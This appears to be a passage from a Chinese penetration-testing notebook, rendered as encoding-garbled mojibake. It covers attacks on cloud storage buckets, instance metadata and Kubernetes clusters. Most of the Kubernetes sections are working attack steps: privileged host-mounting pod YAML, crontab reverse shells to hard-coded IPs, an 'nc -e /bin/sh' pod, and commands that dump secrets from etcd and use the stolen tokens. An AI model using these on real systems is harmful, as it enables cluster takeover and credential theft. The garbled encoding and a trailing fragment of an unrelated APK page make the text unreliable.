¹æ®ç­–ç•¥è¿›è¡Œè¯·æ±‚ä»è€Œè®¿é—®å­˜å‚¨æ¡¶ Bucket Policyå…è®¸ä¿®æ”¹ ä½¿ç”¨äº‘å‚å•†å·¥å…·ä¿®æ”¹ç­–ç•¥ä¸­çš„Denyä¸ºAllowå³å¯è®¿é—®å­˜å‚¨æ¡¶ åŸŸåè§£æé—®é¢˜ æ–‡ä»¶è§£æé—®é¢˜ å­˜å‚¨æ¡¶åªç”¨ä½œå­˜å‚¨ï¼Œè®¿é—®å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æ˜¯ä¸è§£æç›´æ¥ä¸‹è½½çš„ ä½†å¦‚æœé…ç½®äº†CNAMEè®°å½• my.com â†’ oss.com oss.com/index.phpä¸è§£æç›´æ¥ä¸‹è½½ my.com/index.phpä¼šè§£æphp å¦‚ä½•ç¡®å®šï¼šping my.com è§£æåˆ°oss.comåˆ™è¯æ˜äº†é…ç½®äº†CNAMEè®°å½• Bucket æ¥ç®¡ åˆ©ç”¨åœºæ™¯ï¼šè®¿é—®æ—¶è¿”å›NoSuchBucket ç±»ä¼¼äºå­åŸŸåæ¥ç®¡ï¼Œåªæ˜¯cnameæŒ‡å‘çš„æ˜¯Bucket å› ä¸ºåŸŸåï¼ˆæºåŸŸåï¼‰é…ç½®äº†CNAMEï¼Œä½†æ˜¯CNAMEæŒ‡å‘çš„åŸŸåå¹¶æ²¡æœ‰è¢«æ³¨å†Œã€‚é‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æ³¨å†Œè¿™ä¸ªCNAMEæŒ‡å‘çš„åŸŸåï¼Œå°±å¯ä»¥æ§åˆ¶äº†æºåŸŸåã€‚ å› ä¸ºåŸŸåé…ç½®äº†CNAMEï¼Œä½†æ˜¯CNAMEæŒ‡å‘çš„Bucketæ²¡æœ‰è¢«æ³¨å†Œï¼ˆè¢«åˆ é™¤äº†ï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æ³¨å†Œè¿™ä¸ªCNAMEæŒ‡å‘çš„Bucketï¼Œä»è€Œæ¥ç®¡è¯¥åŸŸåã€‚ å‚è€ƒæ–‡ç« ï¼šè®°ä¸€æ¬¡å› ä¸º S3 bucket åˆ é™¤è€Œå¯¼è‡´çš„å­åŸŸåæ¥ç®¡(subdomain takeover)çš„å®‰å…¨é—®é¢˜ | Zach Ke's Notes (kebingzao.com) AK/SKæ³„éœ² æ¥ç®¡ äº‘æœåŠ¡å™¨ è§’è‰²è®¿é—®æ§åˆ¶ æˆæƒè§’è‰²å¯ä»¥ä½¿ç”¨å“ªäº›äº‘æœåŠ¡ å…ƒæ•°æ® å…ƒæ•°æ®æœåŠ¡æ˜¯ä¸€ç§æä¾›æŸ¥è¯¢è¿è¡Œä¸­çš„å®ä¾‹å†…å…ƒæ•°æ®çš„æœåŠ¡ã€‚ é€šè¿‡å…ƒæ•°æ®ï¼Œæ”»å‡»è€…é™¤äº†å¯ä»¥è·å¾— äº‘æœåŠ¡å™¨ ä¸Šçš„ä¸€äº›å±æ€§ä¿¡æ¯ä¹‹å¤–ï¼Œæœ‰æ—¶è¿˜å¯ä»¥è·å¾—ä¸è¯¥å®ä¾‹ç»‘å®šè§’è‰²çš„ä¸´æ—¶å‡­è¯ï¼Œå¹¶é€šè¿‡è¯¥ä¸´æ—¶å‡­è¯è·å¾—äº‘æœåŠ¡å™¨çš„æ§åˆ¶å°æƒé™ï¼Œè¿›è€Œæ¨ªå‘åˆ°å…¶ä»–æœºå™¨ã€‚ åˆ©ç”¨åœºæ™¯ è·å–ç›®æ ‡ äº‘æœåŠ¡å™¨ æƒé™æˆ–è€…ç›®æ ‡äº‘æœåŠ¡å™¨ å­˜åœ¨ SSRF æ¼æ´ ç›¸å…³è¯·æ±‚ curl http://ip/latest/meta-data // è·å–ä¸´æ—¶å‡­è¯è¦åŠ æœ€åçš„/ curl http://ip/latest/meta-data/ram/security-credentials/ // å¦‚æœé…ç½®äº†è®¿é—®æ§åˆ¶è§’è‰²å°†ä¼šåˆ—å‡º curl http://ip/latest/meta-data/ram/security-credentials/ecs // è·å–ecsè§’è‰²çš„ä¸´æ—¶å‡­è¯ // å…¶ä»–å…³é”®ä¿¡æ¯ /latest/meta-data/mac å®ä¾‹ MAC åœ°å€ /latest/meta-data/hostname å®ä¾‹ä¸»æœºå /latest/meta-data/ram/info è·å–è§’è‰²åç§° /latest/meta-data/local-ipv4 å®ä¾‹æœ¬åœ° IP /latest/meta-data/public-ipv4 å®ä¾‹å…¬ç½‘ IP /latest/meta-data/instance-id å®ä¾‹ ID /latest/meta-data/public-hostname æ¥å£çš„å…¬æœ‰ DNS (IPv4) /latest/meta-data/placement/region å®ä¾‹çš„åŒºåŸŸ /latest/meta-data/public-keys/0/openssh-key å…¬æœ‰å¯†é’¥ /latest/meta-data/ram/security-credentials/ è·å–è§’è‰²çš„ä¸´æ—¶å‡­è¯ é˜¿é‡Œäº‘ä¸ºRAMè®¿é—®æ§åˆ¶ï¼ŒAWSä¸ºiamè®¿é—®æ§åˆ¶ï¼Œä¸åŒå‚å•†çš„åç§°ä¸åŒï¼Œå…ƒæ•°æ®çš„è·¯å¾„ä¹Ÿè¦æ›¿æ¢ k8s--Kubernetes åŸºæœ¬ä»‹ç» Kubernetesï¼ˆç®€ç§° k8sï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨ç®¡ç†å¹³å°ï¼Œç”¨äºè‡ªåŠ¨åŒ–éƒ¨ç½²ã€æ‰©å±•å’Œç®¡ç†å®¹å™¨åŒ–çš„åº”ç”¨ç¨‹åºã€‚ äº†è§£ï¼šhttps://golangguide.top/%E6%9E%B6%E6%9E%84/%E4%BA%91%E5%8E%9F%E7%94%9F/%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/k8s%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88.html ç»„ä»¶ä»‹ç» Scheduler ï¼šè°ƒåº¦å™¨ï¼Œæ‰¾åˆ°èƒ½æ»¡è¶³ Pod éƒ¨ç½²æ‰€éœ€ç¡¬ä»¶èµ„æºçš„NodeèŠ‚ç‚¹ æ§åˆ¶å¹³é¢ï¼ˆmasterèŠ‚ç‚¹ï¼‰ç”¨äºç®¡ç†nodeèŠ‚ç‚¹ nodeèŠ‚ç‚¹æ˜¯ä¸€å°ç‹¬ç«‹çš„ç‰©ç†æœºä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œä¸Šé¢è¿è¡Œç€podå’Œå…¶ä»–é€šä¿¡æœåŠ¡ï¼Œpodå®é™…ä¸Šå°±æ˜¯ç”¨dockeræ­å»ºçš„æœåŠ¡ã€‚ é›†ç¾¤ï¼ˆClusterï¼‰= æ§åˆ¶å¹³é¢ï¼ˆMasterèŠ‚ç‚¹ï¼‰+ å¤šä¸ªnodeèŠ‚ç‚¹ï¼ŒpodåŒæ—¶éƒ¨ç½²åœ¨å¤šä¸ªnodeèŠ‚ç‚¹ä¸Šï¼ˆé€šè¿‡ä¸åŒçš„nodeèŠ‚ç‚¹ipéƒ½å¯ä»¥è®¿é—®åˆ°podæœåŠ¡ï¼Œä¸€ä¸ªpodæœåŠ¡æŒ‚äº†ï¼Œå…¶å®ƒèŠ‚ç‚¹ä¸Šçš„ä»å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œå°±ç›¸å½“äºå®¹ç¾ï¼‰ éƒ¨ç½²æœåŠ¡ é¦–å…ˆæˆ‘ä»¬éœ€è¦ç¼–å†™ YAML æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å®šä¹‰ Pod é‡Œç”¨åˆ°äº†å“ªäº›é•œåƒï¼Œå ç”¨å¤šå°‘å†…å­˜å’Œ CPU ç­‰ä¿¡æ¯ã€‚ ç„¶åä½¿ç”¨ kubectl å‘½ä»¤è¡Œå·¥å…·æ‰§è¡Œ kubectl apply -f xx.yaml ï¼Œæ­¤æ—¶ kubectl ä¼šè¯»å–å’Œè§£æ YAML æ–‡ä»¶ï¼Œå°†è§£æåçš„å¯¹è±¡é€šè¿‡ API è¯·æ±‚å‘é€ç»™ Kubernetes æ§åˆ¶å¹³é¢å†… çš„ API Serverã€‚ API Server ä¼šæ ¹æ®è¦æ±‚ï¼Œé©±ä½¿ Scheduler é€šè¿‡ etcd æä¾›çš„æ•°æ®å¯»æ‰¾åˆé€‚çš„ Nodeï¼Œ Controller Manager ä¼šé€šè¿‡ API Server æ§åˆ¶ Node åˆ›å»ºæœåŠ¡ï¼ŒNode å†…éƒ¨çš„ kubelet åœ¨æ”¶åˆ°å‘½ä»¤åä¼šå¼€å§‹åŸºäº Container runtime ç»„ä»¶å»æ‹‰å–é•œåƒåˆ›å»ºå®¹å™¨ï¼Œæœ€ç»ˆå®Œæˆ Pod çš„åˆ›å»ºã€‚ å¤–éƒ¨è¯·æ±‚å¤„ç† ä»¥å‰å¤–éƒ¨ç”¨æˆ·å°æ˜ï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸Šå‘é€ http è¯·æ±‚ï¼Œå°±èƒ½æ‰“åˆ°æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„ Nginxï¼Œç„¶åè½¬å‘åˆ°éƒ¨ç½²çš„æœåŠ¡å†…ã€‚ ç”¨äº† k8s ä¹‹åï¼Œå¤–éƒ¨è¯·æ±‚ä¼šå…ˆåˆ°è¾¾ k8s é›†ç¾¤çš„ Ingress æ§åˆ¶å™¨ï¼Œç„¶åè¯·æ±‚ä¼šè¢«è½¬å‘åˆ° k8s å†…éƒ¨çš„æŸä¸ª Node çš„ Kube Proxy ä¸Šï¼Œå†æ‰¾åˆ°å¯¹åº”çš„ podï¼Œç„¶åæ‰æ˜¯è½¬å‘åˆ°å†…éƒ¨å®¹å™¨æœåŠ¡ä¸­ï¼Œå¤„ç†ç»“æœåŸè·¯è¿”å›ï¼Œåˆ°è¿™å°±å®Œæˆäº†ä¸€æ¬¡æœåŠ¡è°ƒç”¨ã€‚ æŒ‡çº¹è¯†åˆ« NodeèŠ‚ç‚¹ ç»„ä»¶åç§° é»˜è®¤ç«¯å£ kubelet 10250/10255 dashboard 8001 kube-proxy 8001 docker 2375 MasterèŠ‚ç‚¹ ç»„ä»¶åç§° é»˜è®¤ç«¯å£ api server 6443ã€8080 dashboard 8001 etcd 2379 kube-scheduler 10251 kube-controller-manager 10252 Dashboardæœªæˆæƒè®¿é—® åˆ©ç”¨åœºæ™¯ é…ç½®æ–‡ä»¶recommended.yamlä¸­å¼€å¯enable-skip-loginï¼Œå¹¶ä¸”ç»™Kubernetes dashboardç»‘å®šcluster-adminç­‰è§’è‰²ï¼Œæ”»å‡»è€…å¯ç›´æ¥åœ¨ç•Œé¢ä¸Šåˆ›å»ºç‰¹æƒpodè¿›è¡Œå®¹å™¨é€ƒé€¸ æ¼æ´åˆ©ç”¨ ç‚¹å‡»dashboardå³ä¸Šè§’çš„åŠ å·åˆ›å»ºpodå¹¶æŒ‚åœ¨å®¿ä¸»æœºçš„æ ¹ç›®å½• apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / è¿™é‡Œå°†å®¿ä¸»æœºçš„ç›®å½•æŒ‚åœ¨åˆ°äº†/mntç›®å½•ä¸‹ å¯ä»¥é€šè¿‡å†™crontabè·å–shell echo -e \"* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/1234 0>&1\" >> /mnt/etc/crontab æˆ–è€…é€šè¿‡chrootæ¥è·å–ç»ˆç«¯ K8s configfile æ³„éœ² K8s configfileä½œä¸ºK8sé›†ç¾¤çš„ç®¡ç†å‡­è¯ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³K8sé›†ç¾¤çš„è¯¦ç»†ä¿¡æ¯ï¼ˆAPI Serverã€ç™»å½•å‡­è¯ï¼‰ã€‚ å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®åˆ°æ­¤æ–‡ä»¶(å¦‚åŠå…¬ç½‘å‘˜å·¥æœºå™¨å…¥ä¾µã€æ³„éœ²åˆ° Github çš„ä»£ç ç­‰)ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡ API Server æ¥ç®¡ K8s é›†ç¾¤ï¼Œå¸¦æ¥é£é™©éšæ‚£ã€‚ ç”¨æˆ·å‡­è¯ä¿å­˜åœ¨ kubeconfig æ–‡ä»¶ä¸­ï¼Œkubectl é€šè¿‡ä»¥ä¸‹é¡ºåºæ¥æ‰¾åˆ° kubeconfig æ–‡ä»¶ï¼š å¦‚æœæä¾›äº†--kubeconfigå‚æ•°ï¼Œå°±ä½¿ç”¨æä¾›çš„ kubeconfig æ–‡ä»¶ã€‚ å¦‚æœæ²¡æœ‰æä¾›--kubeconfig å‚æ•°ï¼Œä½†è®¾ç½®äº†ç¯å¢ƒå˜é‡ $KUBECONFIGï¼Œåˆ™ä½¿ç”¨è¯¥ç¯å¢ƒå˜é‡æä¾›çš„ kubeconfig æ–‡ä»¶ã€‚ å¦‚æœä»¥ä¸Šä¸¤ç§æƒ…å†µéƒ½æ²¡æœ‰ï¼Œkubectl å°±ä½¿ç”¨é»˜è®¤çš„ kubeconfig æ–‡ä»¶ $HOME/.kube/configã€‚ æ¼æ´åˆ©ç”¨ é€šè¿‡Dashboardçš„é…ç½®æ–‡ä»¶æ–¹å¼ç™»å½• ä½¿ç”¨kubectl # è¿æ¥ kubectl -s https://ip:6443 --kubeconfig=config1 -insecure-skip-tls-verify=true get nodes # åˆ›å»ºæ¶æ„pod kubectl apply -f test.yaml -n default --kubeconfig=config1 --insecure-skip-tls-verify=true #è¿æ¥ pod åè¿›è¡Œå®¹å™¨æŒ‚è½½é€ƒé€¸ kubectl exec -it myapp bash -n default --kubeconfig=config1 cd /mnt chroot . bash # test.yaml apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: nginx name: myapp volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / MasterèŠ‚ç‚¹æ”»å‡» API Server æœªæˆæƒè®¿é—® åˆ©ç”¨åœºæ™¯ æ—§ç‰ˆæœ¬çš„k8sçš„API Serveré»˜è®¤ä¼šå¼€å¯ä¸¤ä¸ªç«¯å£ï¼š8080å’Œ6443ã€‚ 6443æ˜¯å®‰å…¨ç«¯å£ï¼Œå®‰å…¨ç«¯å£ä½¿ç”¨TLSåŠ å¯†ï¼›8080ç«¯å£æ— éœ€è®¤è¯httpè®¿é—®ï¼Œä»…ç”¨äºæµ‹è¯•ã€‚é«˜ç‰ˆæœ¬çš„k8så·²ç»é»˜è®¤ä¸å¼€å¯8080ç«¯å£ 8080ç«¯å£--k8s æ–°ç‰ˆæœ¬éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/kubernetes/manifests/kube-apiserver.yaml é»˜è®¤ç«¯å£8080ï¼Œä¿®æ”¹æ ‡è¯†â€“insecure-port é»˜è®¤IPæ˜¯æœ¬åœ°ä¸»æœºï¼Œä¿®æ”¹æ ‡è¯†â€”insecure-bind-address 6443ç«¯å£ é‰´æƒé…ç½®ä¸å½“ï¼Œå°†\"system:anonymous\"ç”¨æˆ·ç»‘å®šåˆ°\"cluster-admin\"ç”¨æˆ·ç»„ï¼Œä»è€Œä½¿ 6443ç«¯å£å…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤å†…éƒ¨ä¸‹å‘æŒ‡ä»¤ã€‚ kubectl-proxyä¸å®‰å…¨é…ç½® å¯¹æ–¹è¿ç»´ä½¿ç”¨å‘½ä»¤kubectl proxyè®¾ç½®API serveræ¥æ”¶æ‰€æœ‰ä¸»æœºçš„è¯·æ±‚ # ç›¸å½“äº8009ç«¯å£API Serveræœªæˆæƒè®¿é—® kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009 æ¼æ´å­˜åœ¨æ—¶ æ¼æ´åˆ©ç”¨ é€šè¿‡kubectlå‘½ä»¤æ”»å‡» # æŸ¥è¯¢nodeså’Œpods kubectl -s http://ip:6443/ get nodes kubectl -s http://ip:6443/ get pods kubectl -s ip:6443 get pod -n [node] # åˆ›å»ºæ¶æ„pods kubectl -s http://ip:6443/ create -f test.yaml test.yaml apiVersion: v1 kind: Pod metadata: name: test spec: containers: - name: busybox image: busybox:1.29.2 command: [\"/bin/sh\"] args: [\"-c\", \"nc 192.168.125.130 7777 -e /bin/sh\"] volumeMounts: - name: host mountPath: /host volumes: - name: host hostPath: path: / type: Directory è·å¾—podçš„shell kubectl -s http://ip:6443/ get namespaces kubectl exec -it -n bash é€šè¿‡httpè¯·æ±‚æ”»å‡» #æŸ¥çœ‹pods https://192.168.4.110:6443/api/v1/namespaces/default/pods?limit=500 #åˆ›å»ºç‰¹æƒå®¹å™¨ https://192.168.4.110:6443/api/v1/namespaces/default/pods/test-4444 {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"test-4444\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"image\\\":\\\"nginx:1.14.2\\\",\\\"name\\\":\\\"test-4444\\\",\\\"volumeMounts\\\":[{\\\"mountPath\\\":\\\"/host\\\",\\\"name\\\":\\\"host\\\"}]}],\\\"volumes\\\":[{\\\"hostPath\\\":{\\\"path\\\":\\\"/\\\",\\\"type\\\":\\\"Directory\\\"},\\\"name\\\":\\\"host\\\"}]}}\\n\"},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}} #æ‰§è¡Œå‘½ä»¤ https://192.168.4.110:6443/api/v1/namespace/default/pods/test-4444/exec?command=whoami # è·å–token /api/v1/namespaces/kube-system/secrets/ etcdæœªæˆæƒè®¿é—® åˆ©ç”¨åœºæ™¯ é…ç½®æ–‡ä»¶ï¼š /etc/kubernetes/manifests/etcd.yaml etcdæœåŠ¡æœ‰V2å’ŒV3ä¸¤ä¸ªç‰ˆæœ¬ k8sé»˜è®¤é…ç½®ä¸‹etcdæœåŠ¡åªä¼šç›‘å¬æœ¬åœ°çš„2379ç«¯å£ æ²¡æœ‰é…ç½®--client-cert-auth å‚æ•°ï¼ˆæ— è¯ä¹¦æ ¡éªŒï¼‰ï¼Œå¤–éƒ¨å¯ä»¥ç›´æ¥æœªæˆæƒè®¿é—®è·å–secretså’Œtokenæ¥æ¥ç®¡API Server é…ç½®--client-cert-auth å‚æ•°ï¼ˆæœ‰è¯ä¹¦æ ¡éªŒï¼‰ï¼Œæœ¬åœ°127.0.0.1:2379å¯å…è®¤è¯è®¿é—®EtcdæœåŠ¡ï¼Œä½†é€šè¿‡å…¶ä»–åœ°å€è®¿é—®è¦æºå¸¦certè¿›è¡Œè®¤è¯è®¿é—®ï¼Œä¸€èˆ¬é…åˆssrfæˆ–å…¶ä»–åˆ©ç”¨ï¼Œè¾ƒä¸ºé¸¡è‚‹ã€‚ æ¼æ´åˆ©ç”¨ è®¿é—® http://ip:2379/v2/keys/?recursive=true V2ç‰ˆæœ¬è¿”å›æ‰€æœ‰çš„key-valueå€¼ V3ç‰ˆæœ¬è¿”å›å¦‚ä¸‹ éœ€è¦ä½¿ç”¨å·¥å…·ï¼šhttps://etcd.io/docs/v3.4/install/ # è·å–k8sçš„secrets ./etcdctl --endpoints=https://ip:2379 get / --prefix --keys-only | grep sceret # è·å–ç”¨æˆ·æŒ‡å®štoken ./etcdctl --endpoints=https://ip:2379 get /registry/secrets/xxxx/xxx ./etcdctl --endpoints=https://ip:2379 get /registry/secrets/kube-system/xxx # é€šè¿‡tokenæ¥ç®¡ kubectl --insecure-skip-tls-verify-s https://ip:6443 --token=\"ey...\" -n kube-system get pods æ±¡ç‚¹æ¨ªå‘ç§»åŠ¨ åŸºæœ¬åŸç† é€šè¿‡å¤–ç½‘è·å¾—äº†ä¸€ä¸ªpodæƒé™ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è·å¾—MasterèŠ‚ç‚¹çš„å®¿ä¸»æœºæƒé™ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ å¯ä»¥æƒ³åˆ°è·å¾—MasterèŠ‚ç‚¹çš„podæƒé™ï¼Œå†é€šè¿‡é€ƒé€¸æˆ–è€…æŒ‚è½½è·å¾—MasterèŠ‚ç‚¹çš„å®¿ä¸»æœºæƒé™ï¼Œé‚£ä¹ˆå°±æ˜¯éœ€è¦éƒ¨ç½²ä¸€ä¸ªæ¶æ„podåˆ°MasterèŠ‚ç‚¹ä¸Šã€‚ å¦‚ä½•è·å¾—éƒ¨ç½²ä¸€ä¸ªæ¶æ„podçš„æƒé™å‘¢ï¼Ÿ Api Server/etcdæœªæˆæƒè®¿é—® ä¸åŒNodeèŠ‚ç‚¹ä¸Šçš„podæœåŠ¡ä¸­çš„ServiceAccount æƒé™ # ç¡®è®¤å½“å‰é»˜è®¤ service-accountæƒé™ ./kubectl auth can-i --list ä¿¡æ¯æ”¶é›†å¾—åˆ°configé…ç½®æ–‡ä»¶ å‡è®¾å·²ç»è·å¾—éƒ¨ç½²ä¸€ä¸ªæ¶æ„podçš„æƒé™ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯é»˜è®¤podæ˜¯ä¸ä¼šè¢«éƒ¨ç½²åˆ°MasterèŠ‚ç‚¹ä¸Šçš„ï¼Œè¿™æ˜¯å› ä¸ºMasterèŠ‚ç‚¹å…·æœ‰æ±¡ç‚¹å±æ€§ï¼Œåªæœ‰å…·å¤‡å¯¹åº”å®¹å¿åº¦çš„podæ‰å¯ä»¥è¢«éƒ¨ç½²åˆ°MasterèŠ‚ç‚¹ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æ¸…é™¤MasterèŠ‚ç‚¹çš„æ±¡ç‚¹æˆ–è€…éƒ¨ç½²podæ—¶åŠ ä¸Šå¯¹åº”å®¹å¿åº¦å±æ€§ æ¨ªå‘ç§»åŠ¨ ä»¥ä¸‹ä¸ºåœ¨podæœåŠ¡çš„webshellä¸Šè¿›è¡ŒApi Serveræœªæˆæƒè®¿é—®æ“ä½œ éƒ¨ç½²podæ—¶åŠ ä¸Šå¯¹åº”å®¹å¿åº¦å±æ€§ # --username=a --password=a å› ä¸ºwebshellä¸æ˜¯äº¤äº’å¼ç»ˆç«¯ï¼Œä¸åŠ çš„è¯ä¼šè®©ä½ è¾“å…¥ç”¨æˆ·åè¿™æ ·æ˜¯è¡Œä¸é€šçš„ ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a # è·å–podçš„æ±¡ç‚¹ä¿¡æ¯ ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a describe nodes | grep Taints # éƒ¨ç½²podåˆ°MasterèŠ‚ç‚¹ï¼Œå¯èƒ½éœ€è¦ä¿®æ”¹å®¹å™¨åå­—å¤šå°è¯•å‡ æ¬¡,è°ƒåº¦é—®é¢˜ï¼Ÿ ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a create -f ./x.yaml # è·å–podä¿¡æ¯ä»¥åŠpodéƒ¨ç½²åˆ°å“ªä¸ªèŠ‚ç‚¹ get pods -o wide ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a get pods -o wide # åå¼¹shellè·å–MasterèŠ‚ç‚¹çš„å®¿ä¸»æœºæƒé™ ./kubectl --server=https://10.96.0.1:443 --insecure-skip-tls-verify=true --username=a --password=a exec control-master-x231 -- bash -c \"echo -e '* * * * * root bash -i >& /dev/tcp/192.168.86.218/6677 0>&1\\\\n' >> /master/etc/crontab\" x.yaml cat > x.yaml nodeName æ˜¯ Pod çš„ä¸€ä¸ªå­—æ®µï¼Œç”¨äºç›´æ¥æŒ‡å®š Pod è¦è¿è¡Œçš„èŠ‚ç‚¹ã€‚ apiVersion: v1 kind: Pod metadata: name: my-pod spec: containers: - name: my-container image: nginx nodeName: node-name # æ›¿æ¢ä¸ºç›®æ ‡èŠ‚ç‚¹çš„åç§° æ¸…é™¤MasterèŠ‚ç‚¹çš„æ±¡ç‚¹ï¼Ÿ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¸…é™¤æ±¡ç‚¹ä¹‹åç›´æ¥æ‰§è¡Œéƒ¨ç½²Podåˆ°Masterä¸Šï¼Œä¹‹åé€šè¿‡æŒ‚è½½å®ç°é€ƒé€¸è·å–MasterèŠ‚ç‚¹çš„æƒé™ #æ¸…é™¤æ±¡ç‚¹ kubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule- #æŸ¥çœ‹æ±¡ç‚¹ kubectl describe node master | grep 'Taints' -A 5 å·¥å…· https://github.com/yeahx/KubeAPI-Inspector/blob/main/README_zh.md https://github.com/cdk-team/CDK å‚è€ƒæ–‡ç«  https://www.bilibili.com/video/BV12om2YTEgW/?spm_id_from=333.788.player.switch&vd_source=09b7dbe7a7fc964ca09096bdd79f031d&p=102 | ç¬¬98å¤©ï¼šäº‘ä¸Šæ”»é˜²-äº‘åŸç”Ÿç¯‡&K8så®‰å…¨&Configæ³„æ¼&Etcdå­˜å‚¨&Dashboardé‰´æƒ&Proxyæš´éœ²_å“”å“©å“”å“©_bilibili https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw | mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ | mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ https://forum.butian.net/share/1095 | å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-äº‘åŸç”Ÿä¹‹Kuberneteså®‰å…¨ https://wiki.teamssix.com/CloudNative/Kubernetes/k8s-horizontal-taints.html | https://kubernetes.io/zh-cn/docs/concepts/scheduling-eviction/assign-pod-node/ | å°† Pod æŒ‡æ´¾ç»™èŠ‚ç‚¹ | Kubernetes https://golangguide.top/%E6%9E%B6%E6%9E%84/%E4%BA%91%E5%8E%9F%E7%94%9F/%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/k8s%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88.html#%E6%80%8E%E4%B9%88%E8%B0%83%E7%94%A8%E6%9C%8D%E5%8A%A1 | golangguide.top/æ¶æ„/äº‘åŸç”Ÿ/æ ¸å¿ƒçŸ¥è¯†ç‚¹/k8såˆ°åº•æ˜¯ä»€ä¹ˆ.html#æ€ä¹ˆè°ƒç”¨æœåŠ¡ https://stack.chaitin.com/techblog/detail/218 | CT Stack å®‰å…¨ç¤¾åŒº https://github.com/sule01u/AutorizePro?tab=readme-ov-file | github.com/sule01u/AutorizePro?tab=readme-ov-file Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-06 21:37:15 "},"01.æ¸—é€æµ‹è¯•/04.ç§»åŠ¨å®‰å…¨/APPæ¸—é€.html":{"url":"01.æ¸—é€æµ‹è¯•/04.ç§»åŠ¨å®‰å…¨/APPæ¸—é€.html","title":"APPæ¸—é€æ€»ç»“","keywords":"","body":"AndroidçŸ¥è¯† APKæ–‡ä»¶ APKï¼ˆAndroid Packageï¼‰æ–‡ä»¶æ˜¯Androidæ“ä½œç³»ç»Ÿä¸Šå®‰è£…åº”ç”¨ç¨‹åºçš„ä¸€ç§æ–‡ä»¶æ ¼å¼ã€‚APKæ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä»£ç ã€èµ„æºå’Œå…¶ä»–æ–‡ä»¶ã€‚ APKæ–‡ä»¶é€šå¸¸å…·æœ‰ä»¥ä¸‹ç»“æ„ï¼š AndroidManifest.xmlï¼šè¿™æ˜¯APKæ–‡ä»¶çš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºåç§°ã€æƒé™ã€ç»„ä»¶ç­‰ã€‚ classes.dexï¼šè¿™æ˜¯APKæ–‡ä»¶ä¸­çš„æ ¸å¿ƒä»£ç æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰Javaä»£ç ã€‚ DEXï¼ˆDalvik Executableï¼‰æ–‡ä»¶æ˜¯ä¸€ç§ä¸“é—¨ä¸ºAndroidæ“ä½œç³»ç»Ÿè®¾è®¡çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚å®ƒæ˜¯å°†Javaå­—èŠ‚ç è½¬æ¢ä¸ºDalvikå­—èŠ‚ç çš„ç»“æœã€‚Dalvikå­—èŠ‚ç æ˜¯ä¸€ç§ç‰¹æ®Šçš„å­—èŠ‚ç 